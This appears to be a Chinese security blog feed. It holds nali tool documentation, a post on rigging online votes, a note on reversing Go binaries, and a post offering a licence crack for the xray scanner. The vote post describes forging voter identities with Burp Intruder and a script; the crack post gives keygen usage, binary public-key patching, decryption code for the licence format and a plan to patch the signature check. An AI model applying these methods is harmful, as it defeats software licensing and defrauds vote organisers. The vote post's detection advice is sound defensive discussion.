<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup google.com | nali
Server:         127.0.0.53 [局域网 IP]
Address:        127.0.0.53 [局域网 IP]#53

Non-authoritative answer:
Name:   google.com
Address: 216.58.211.110 [美国 Google全球边缘网络]
Name:   google.com
Address: 2a00:1450:400e:809::200e [荷兰Amsterdam Google Inc. 服务器网段]
</code></pre></td></tr></table>
</div>
</div><h3 id="查询-cdn-服务提供商">查询 CDN 服务提供商</h3>
<p>因为 CDN 服务通常使用 CNAME 的域名解析方式，所以推荐与 <code>nslookup</code> 或者 <code>dig</code> 配合使用，在已经知道 CNAME 后可单独使用</p>
<h4 id="只查询-cdn-服务提供商">只查询 CDN 服务提供商</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup www.gov.cn | nali cdn
Server:         127.0.0.53
Address:        127.0.0.53#53

Non-authoritative answer:
www.gov.cn      canonical name = www.gov.cn.bsgslb.cn [白山云 CDN].
www.gov.cn.bsgslb.cn [白山云 CDN]       canonical name = zgovweb.v.bsgslb.cn [白山云 CDN].
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 185.232.56.148
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 185.232.56.147
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::6
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::5
</code></pre></td></tr></table>
</div>
</div><h4 id="查询所有信息">查询所有信息</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup www.gov.cn | nali
Server:         127.0.0.53 [局域网 IP]
Address:        127.0.0.53 [局域网 IP]#53

Non-authoritative answer:
www.gov.cn      canonical name = www.gov.cn.bsgslb.cn [白山云 CDN].
www.gov.cn.bsgslb.cn [白山云 CDN]       canonical name = zgovweb.v.bsgslb.cn [白山云 CDN].
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 103.104.170.25 [新加坡 ]
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::5 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)]
Name:   zgovweb.v.bsgslb.cn [白山云 CDN]
Address: 2001:428:6402:21b::6 [美国Louisiana州Monroe Qwest Communications Company, LLC (CenturyLink)]
</code></pre></td></tr></table>
</div>
</div><h4 id="单独使用">单独使用</h4>
<p>需要提前查询到 CNAME 域名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali cdn cdn.somecdncname.com
</code></pre></td></tr></table>
</div>
</div><h2 id="用户交互">用户交互</h2>
<h3 id="查看帮助">查看帮助</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali --help
Usage:
  nali [flags]
  nali [command]

Available Commands:
  cdn         Query cdn service provider
  help        Help about any command
  parse       Query IP information
  update      update chunzhen ip database

Flags:
  -h, --help     help for nali
  -t, --toggle   Help message for toggle

Use &#34;nali [command] --help&#34; for more information about a command.
</code></pre></td></tr></table>
</div>
</div><h3 id="更新纯真数据库">更新纯真数据库</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali update
2020/07/17 12:53:46 正在下载最新纯真 IP 库...
2020/07/17 12:54:05 已将最新的纯真 IP 库保存到本地 /root/.nali/qqwry.dat
</code></pre></td></tr></table>
</div>
</div><h3 id="使用-geoip2-数据库">使用 Geoip2 数据库</h3>
<p>需要设置环境变量： <code>NALI_DB</code></p>
<p>支持的变量内容:</p>
<ul>
<li>Geoip2 <code>['geoip', 'geoip2', 'geo']</code></li>
<li>Chunzhen <code>['chunzhen', 'qqip', 'qqwry']</code></li>
</ul>
<h4 id="windows平台">Windows平台</h4>
<h5 id="使用geoip数据库">使用geoip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">set NALI_DB=geoip
</code></pre></td></tr></table>
</div>
</div><h5 id="使用ipip数据库">使用ipip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">set NALI_DB=ipip
</code></pre></td></tr></table>
</div>
</div><h4 id="linux平台">Linux平台</h4>
<h5 id="使用geoip数据库-1">使用geoip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">export NALI_DB=geoip
</code></pre></td></tr></table>
</div>
</div><h5 id="使用ipip数据库-1">使用ipip数据库</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">export NALI_DB=ipip
</code></pre></td></tr></table>
</div>
</div><h3 id="更换数据库目录">更换数据库目录</h3>
<p>如果未指定数据库存放目录，数据库默认将存放在 <code>~/.nali</code></p>
<p>设置环境变量 <code>NALI_DB_HOME</code> 来指定数据库目录</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">set NALI_DB_HOME=D:\nalidb

or

export NALI_DB_HOME=/home/nali
</code></pre></td></tr></table>
</div>
</div><h2 id="感谢列表">感谢列表</h2>
<ul>
<li><a href="http://www.cz88.net/fox/ipdat.shtml" target="_blank" rel="noopener noreffer">纯真QQIP离线数据库</a></li>
<li><a href="https://qqwry.mirror.noc.one/" target="_blank" rel="noopener noreffer">qqwry mirror</a></li>
<li><a href="https://github.com/yinheli/qqwry" target="_blank" rel="noopener noreffer">qqwry纯真数据库解析</a></li>
<li><a href="https://ip.zxinc.org/ipquery/" target="_blank" rel="noopener noreffer">ZX公网ipv6数据库</a></li>
<li><a href="https://www.maxmind.com/en/geoip2-precision-city-service" target="_blank" rel="noopener noreffer">Geoip2 city数据库</a></li>
<li><a href="https://github.com/oschwald/geoip2-golang" target="_blank" rel="noopener noreffer">geoip2-golang解析器</a></li>
<li><a href="https://github.com/SukkaLab/cdn" target="_blank" rel="noopener noreffer">CDN provider数据库</a></li>
<li><a href="https://www.ipip.net/product/ip.html" target="_blank" rel="noopener noreffer">IPIP数据库</a></li>
<li><a href="https://github.com/ipipdotnet/ipdb-go" target="_blank" rel="noopener noreffer">IPIP数据库解析</a></li>
<li><a href="https://github.com/spf13/cobra" target="_blank" rel="noopener noreffer">Cobra CLI库</a></li>
<li><a href="https://github.com/SukkaW/nali-cli" target="_blank" rel="noopener noreffer">Nali-cli</a></li>
</ul>
<h2 id="开源证书">开源证书</h2>
<p>MIT</p>
]]></description></item><item><title>关于刷票</title><link>https://lgf.im/posts/security/web-security/brush-votes/</link><pubDate>Mon, 13 Jul 2020 20:06:48 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/brush-votes/</guid><description><![CDATA[<p>相信大家都经历过朋友圈、群组里各种转发求投票的消息，有需求就会有刷票</p>
<p>关于刷票我自己也稍微研究过，这里说的刷票是指刷投票，不是黄牛那种抢票</p>
<h2 id="初识刷票">初识刷票</h2>
<p>人生中第一次刷票是在大一，舍友的姐姐结婚拍婚纱照，摄影店给了一个点赞链接，承诺点赞数量超过500票免费送豪华相册和相框</p>
<p>舍友让我们帮着转发和点赞，这种东西大家都懂，不想污染了朋友圈，但又不能不帮舍友，碰巧当时正在研究微信抓包啥的，便想研究一下看看能不能刷票</p>
<p>投票网页要求必须微信打开，如果是普通浏览器打开不让投票，但是在微信进行投票它也没有弹出那个获取微信个人信息的确认框，这让我怀疑他根本没有利用微信的信息进行身份确认，有可能可以伪造身份进行刷票</p>
<p>早期微信抓包非常简单，手机root后安装xposed，使用JustTrustMe插件信任所有证书，然后手机安装burp的证书，wifi使用burp的代理，然后就能使用burp对https进行抓包了</p>
<p>抓包后发现投票的确没有仔细检查个人信息，于是通过Burp的Intruder伪造了身份，重放几百次顺利给舍友刷取几百票，圆满完成他姐姐交给他的任务</p>
<h2 id="前几天的刷票">前几天的刷票</h2>
<p>前几天出于好奇又刷了一波票，这次经历是我写这篇文章的主要动机</p>
<p>前几天，我们导员、任课老师、教务等疯狂发钉钉、朋友圈、QQ群、QQ空间，让帮我们学弟投票</p>
<p>随手投上一票，发现投票网站需要使用姓名和手机号码注册，但是没有验证手机验证码，并且没有限制浏览器，感觉必有刷票的机会</p>
<p>于是对网页的所有请求进行抓包分析，发现投票是使用WebSocket进行的，投票时只需要给出登录成功的token和要投的队伍号</p>
<p>关键就在这个登录上了，如果能够有效验证投票者身份就能够减轻刷票，但是分析注册和登录请求发现并没有对用户身份进行有效验证，手机号码可以随便伪造</p>
<p>并且，姓名字段没有任何要求，没有限制长度，没有限制必须是中文，随便一个字符串就能被接受</p>
<p>于是写了一个程序，自动伪造身份登录、投票，循环这个过程</p>
<h2 id="认识与建议">认识与建议</h2>
<p>上面两个案例是成功的刷票经历，我也经历过几次失败的刷票经历，在失败的经历中，那些投票系统都是利用微信提供的用户信息验证用户身份，而微信本身对用户审核的很严（没办法伪造），我也没有多个微信号，刷票自然失败</p>
<p>实际上，刷票过程最重要的是伪造投票者身份，欺骗投票系统是不同用户进行的投票，所以投票系统防刷票最重要的就是验证用户身份</p>
<p>在实际应用中有很多验证用户身份的方法：</p>
<ul>
<li>验证手机号（发验证码的那种）</li>
<li>验证是否真人（极验、reCaptcha）</li>
<li>利用微信提供的身份</li>
</ul>
<p>对于验证手机号，刷票组织可以轻松的获取大量手机号，包括各种真号码、虚拟号码，这种方法可以轻松绕过</p>
<p>对于使用机器人验证器，绕过比较麻烦，但是也是可以通过程序绕过的，并且刷票组织有可能人力手工进行验证</p>
<p>使用微信提供的身份信息是最难搞的，因为微信本身审核的很严，提供的身份又无法伪造，这里利用的是微信对用户身份的验证，是可以信任的。但是也不是没有绕过的方法，刷票组织有时候会养了大批量的微信号用来刷票，利用群控手段也可以绕过。</p>
<p>并且，有很多刷票组织养着很多群，可以提供真人投票服务，这种刷票成本非常高，但是是无法检测的，刷票成功率100%</p>
<p>针对刷票行为，无法完全避免，我们能做的就是通过各种方式对用户身份进行验证，检查用户IP，尽量避免身份伪造</p>
<p>同时，可以对投票请求的频率等信息进行分析，因为脚本刷票投票会很集中、时间间隔会比较均匀</p>
]]></description></item><item><title>Golang逆向思考</title><link>https://lgf.im/posts/security/reverse/golang-reverse-thinking/</link><pubDate>Sat, 20 Jun 2020 17:48:53 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/reverse/golang-reverse-thinking/</guid><description><![CDATA[<p>在前段时间对xray进行逆向过程中，发现golang编译的程序会有巨多函数，不能说都是多余的，但是大部分函数的确不是用户编写的代码生成的，而是golang运行时和各种库所需要的东西</p>
<p>同时，因为去除了符号表，这些大量的非实际业务代码会对我们逆向工作造成极大困难，如果能够利用一些自动化工具重建符号表或者重新命名，就可以极大的便利我们逆向</p>
<h2 id="golang特殊段">golang特殊段</h2>
<p>在本次逆向的过程中，我遇到了上述的问题，在网上搜索发现了一个ida插件， <a href="https://github.com/sibears/IDAGolangHelper.git" target="_blank" rel="noopener noreffer">IDAGolangHelper</a></p>
<p>这个插件的作者对golang编译器有深入的研究，他发现golang编译器在linux平台下交叉编译windows平台下运行的程序时，会生成一个特殊的段<code>.gopclntab</code>，在这个段中会保存一份特殊的符号表，作者利用这个段的信息对符号表进行了重建，我在使用过程中发现效果不错</p>
<p>但是该方法的使用是由限制条件的，如果没有这个段的信息就完全无法使用这个工具了</p>
<h2 id="基于同源性">基于同源性</h2>
<p>golang编译生成的程序中大部分函数都是<code>golang运行时函数</code>和一些<code>库函数</code></p>
<p>运行时函数与golang版本、运行平台和操作系统有关，感觉也会与是否采用交叉编译有关系，我没有深入研究</p>
<p>而库函数分为官方库和第三方库两种，官方库是golang官方维护的基本函数库，大家用的都是相同的，第三方库大家用的实际上也是比较集中，golang生态还不是非常完善，好用的库就那么多</p>
<p>基于以上的特点，我们可以考虑使用同源性分析的方法</p>
<h3 id="预先的工作">预先的工作</h3>
<p>在逆向之前，我们需要进行预先的准备</p>
<p>首先需要使用不同版本、不同平台的golang编译器对go运行时函数、基本库函数、知名第三方库函数等代码针对不同目标平台、目标系统进行编译，生成二进制程序，然后对二进制的函数提取特征，建立函数的特征库</p>
<h3 id="特征匹配">特征匹配</h3>
<p>在逆向的时候，我们就可以先分析程序的golang版本、编译平台、运行平台，然后使用相对应的特征库对去除了符号表的二进制函数进行特征匹配，通过这种方法可以对大部分基本的函数重建符号表，而剩余的小量函数便可以确定为用户编写的代码，需要我们深入分析</p>
<p>这个工作应该已经有人开始做了</p>
]]></description></item><item><title>xray社区高级版破解</title><link>https://lgf.im/posts/security/reverse/xray-cracker/</link><pubDate>Thu, 18 Jun 2020 09:06:25 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/reverse/xray-cracker/</guid><description><![CDATA[<blockquote>
<p>首先感谢 长亭科技 提供 xray 这款非常方便非常好用的安全工具<br>
俗话说：没有人破解的工具不是好工具<br>
根据没有任何数据支持的统计，大部分安全研究人员使用的安全工具都是盗版<br>
包括但不限于： IDA \ JEB \ BurpSuite \ Vmware</p>
</blockquote>
<p>前几天长亭官方有个活动，可以领 2 个月的 xray 社区高级版证书，正好趁这个机会逆向分析了一下 xray 的证书算法，写了一个证书生成器</p>
<p>因为 xray 证书用到了 rsa 算法，所以需要替换 xray 程序中的公钥，将该功能也集成在工具中了</p>
<h2 id="工具使用">工具使用</h2>
<h3 id="查看帮助">查看帮助</h3>
<p>使用 <code>-h</code> 查看帮助</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">PS &gt; .<span class="se">\x</span>ray-cracker -h
破解xray高级版证书，使用 -h 参数查看使用帮助

Usage of xray-cracker:
  -c string
        替换xray程序内置公钥，需要指定xray程序文件路径
  -g string
        生成一个永久license，需要指定用户名
  -p string
        解析官方证书，需要指定证书路径
</code></pre></td></tr></table>
</div>
</div><h3 id="生成证书">生成证书</h3>
<p>使用 <code>-g username</code> 生成永久证书</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">PS &gt; .<span class="se">\x</span>ray-cracker -g <span class="s2">&#34;我叫啥&#34;</span>
破解xray高级版证书，使用 -h 参数查看使用帮助

证书已写入文件：xray-license.lic
</code></pre></td></tr></table>
</div>
</div><h3 id="破解-xray">破解 xray</h3>
<p>使用 <code>-c path-to-xray</code> 修改 xray 内置公钥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">PS &gt; .<span class="se">\x</span>ray-cracker -c .<span class="se">\x</span>ray_windows_amd64.exe
破解xray高级版证书，使用 -h 参数查看使用帮助

public key index: <span class="m">16741321</span>
文件写入成功： .<span class="se">\x</span>ray_windows_amd64.exe
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>工具虽然是 windows 平台下运行，但是照样可以破解其他平台 xray<br>
目前 xray 最新版是 1.0.0，现在全平台全版本通杀</p>
</blockquote>
<h2 id="破解效果">破解效果</h2>
<p>使用修改版 xray 和永久证书后，效果如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">PS &gt; .<span class="se">\x</span>ray_windows_amd64.exe version

 __   __  _____              __     __
 <span class="se">\ \ </span>/ / <span class="p">|</span>  __ <span class="se">\ </span>     /<span class="se">\ </span>    <span class="se">\ \ </span>  / /
  <span class="se">\ </span>V /  <span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span>    /  <span class="se">\ </span>    <span class="se">\ \_</span>/ /
   &gt; &lt;   <span class="p">|</span>  _  /    / /<span class="se">\ \ </span>    <span class="se">\ </span>  /
  / . <span class="se">\ </span> <span class="p">|</span> <span class="p">|</span> <span class="se">\ \ </span>  / ____ <span class="se">\ </span>    <span class="p">|</span> <span class="p">|</span>
 /_/ <span class="se">\_\ </span><span class="p">|</span>_<span class="p">|</span>  <span class="se">\_\ </span>/_/    <span class="se">\_\ </span>   <span class="p">|</span>_<span class="p">|</span>


Version: 1.0.0/62161168/COMMUNITY-ADVANCED
Licensed to 我叫啥, license is valid <span class="k">until</span> 2099-09-09 08:00:00

<span class="o">[</span>xray 1.0.0/62161168<span class="o">]</span>
Build: <span class="o">[</span>2020-06-13<span class="o">]</span> <span class="o">[</span>windows/amd64<span class="o">]</span> <span class="o">[</span>RELEASE/COMMUNITY-ADVANCED<span class="o">]</span>
Compiler Version: go version go1.14.1 linux/amd64
License ID: <span class="m">00000000000000000000000000000000</span>
User Name: 我叫啥/00000000000000000000000000000000
Not Valid Before: 2020-06-12 00:00:00
Not Valid After: 2099-09-09 08:00:00
</code></pre></td></tr></table>
</div>
</div><h2 id="部分细节">部分细节</h2>
<blockquote>
<p>距离博文发布已经过了快一个月了，补充一点点细节信息，希望能够帮助到部分研究学习的同学</p>
</blockquote>
<p>这里只给出使用的关键函数和关键流程，一些重要参数细节需要自己探索，可以动态单步调试获得</p>
<h3 id="aes-解密">AES 解密</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">decode_data</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">base64</span><span class="p">.</span><span class="nx">StdEncoding</span><span class="p">.</span><span class="nf">DecodeString</span><span class="p">(</span><span class="nx">licenseString</span><span class="p">)</span>
<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
  <span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="p">}</span>

<span class="nx">aesDecData</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">AesCBCDecryptAndUnPad</span><span class="p">(</span><span class="nx">decode_data</span><span class="p">[</span><span class="mi">17</span><span class="p">:])</span>
<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
  <span class="nb">panic</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
<span class="p">}</span>

<span class="nx">licensePlainJsonBytes</span> <span class="o">:=</span> <span class="nx">aesDecData</span><span class="p">[</span><span class="mh">0x102</span><span class="p">:]</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="rsa-签名验证">RSA 签名验证</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-go" data-lang="go"><span class="nx">sum</span> <span class="o">:=</span> <span class="nx">sha256</span><span class="p">.</span><span class="nf">Sum256</span><span class="p">(</span><span class="nx">licensePlainJsonBytes</span><span class="p">)</span>
<span class="nx">err</span> <span class="p">=</span> <span class="nx">rsa</span><span class="p">.</span><span class="nf">VerifyPSS</span><span class="p">(</span><span class="nx">pubKey</span><span class="p">,</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">SHA256</span><span class="p">,</span> <span class="nx">sum</span><span class="p">[:],</span> <span class="nx">aesDecData</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mh">0x102</span><span class="p">],</span> <span class="kc">nil</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="2020年8月27日-补充">2020年8月27日 补充</h2>
<p>xray 官方在 1.3.0 版本中更换了授权验证机制，所以破解仅支持到 1.2.0 版本，本文使用代码现在开源： <a href="https://github.com/zu1k/xray-crack">https://github.com/zu1k/xray-crack</a></p>
<h2 id="2020年9月30日-补充">2020年9月30日 补充</h2>
<p>前几天有大佬私发我一个 License，我就又对证书算法研究了一下</p>
<p>相关代码也已经更新到 github 了</p>
<h3 id="证书生成">证书生成</h3>
<p>证书生成验证整体的思路没有大的改动，还是先 AES 解密，然后 RSA 签名验证，只是前后增加了两处简单的变换</p>
<p>在解密前有一个简单的交换，开始和最后的两个两个没有参与运算（开始第一个字节是证书版本号）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-golang" data-lang="golang"><span class="nx">right</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="nx">base64DecodeData</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
<span class="k">for</span> <span class="nx">l</span> <span class="o">:=</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">l</span> <span class="p">&lt;</span> <span class="nx">right</span><span class="p">;</span> <span class="nx">l</span><span class="o">++</span> <span class="p">{</span>
  <span class="nx">r</span> <span class="o">:=</span> <span class="nx">right</span> <span class="o">-</span> <span class="nx">l</span>
  <span class="k">if</span> <span class="nx">l</span> <span class="o">&gt;=</span> <span class="nx">r</span> <span class="p">{</span>
    <span class="k">break</span>
  <span class="p">}</span>
  <span class="nx">base64DecodeData</span><span class="p">[</span><span class="nx">l</span><span class="p">],</span> <span class="nx">base64DecodeData</span><span class="p">[</span><span class="nx">r</span><span class="p">]</span> <span class="p">=</span> <span class="nx">base64DecodeData</span><span class="p">[</span><span class="nx">r</span><span class="p">],</span> <span class="nx">base64DecodeData</span><span class="p">[</span><span class="nx">l</span><span class="p">]</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>然后进行 aes 解密，密钥是写死的，IV 是附加在证书里面的，刚刚的变换结束后，除去第一个字节是版本号，紧接着的 16 个字节是 AES 的 IV</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-golang" data-lang="golang"><span class="nx">aesDecData</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">Decrypt</span><span class="p">(</span><span class="nx">base64DecodeData</span><span class="p">[</span><span class="mi">17</span><span class="p">:],</span> <span class="nx">base64DecodeData</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">17</span><span class="p">])</span>
</code></pre></td></tr></table>
</div>
</div><p>AES 解密后就会遇到另一个变换，是简单的异或处理</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-golang" data-lang="golang"><span class="k">for</span> <span class="nx">i</span> <span class="o">:=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="p">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="nx">aesDecData</span><span class="p">);</span> <span class="nx">i</span><span class="o">++</span> <span class="p">{</span>
  <span class="nx">aesDecData</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="p">=</span> <span class="nx">aesDecData</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="p">^</span> <span class="mh">0x44</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>然后后面的部分就跟之前一样了</p>
<h3 id="公钥">公钥</h3>
<p>在新的版本中，RSA 的公钥被加密处理了，在运行的时候解密，这样做可以防止我们通过简单的公钥替换通杀所有的版本和平台</p>
<p>通过逆向发现，解密函数有二百多个局部变量，先是变量之间互相交换，然后两两进行加、减、异或等操作来还原公钥信息</p>
<p>我推测是用程序生成的代码，然后那生成的代码编译的，这样可以在每一次编译的时候重新生成一下代码，增加我们破解的时间</p>
<p>从这一方面出发，我只能变换一下思路，不能去硬刚</p>
<p>Golang 中 RSA 签名验证代码如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-golang" data-lang="golang"><span class="nx">err</span> <span class="o">:=</span> <span class="nx">rsa</span><span class="p">.</span><span class="nf">VerifyPSS</span><span class="p">(</span><span class="nx">pubKey</span><span class="p">,</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">SHA256</span><span class="p">,</span> <span class="nx">sum</span><span class="p">[:],</span> <span class="nx">aesDecData</span><span class="p">[</span><span class="mi">2</span><span class="p">:</span><span class="mh">0x102</span><span class="p">],</span> <span class="kc">nil</span><span class="p">)</span>
<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
  <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;签名验证 失败&#34;</span><span class="p">)</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
  <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;签名验证 成功&#34;</span><span class="p">)</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>很明显，是通过判断返回值是否为空来确定签名验证是否成功的，在汇编中一般为<code>test eax,eax</code>，然后<code>setnz</code>或者<code>setz</code>，所以我可以修改这里</p>
<p>但是这种方法我只能手工修改，目前没有实现用程序来自动化</p>
<blockquote>
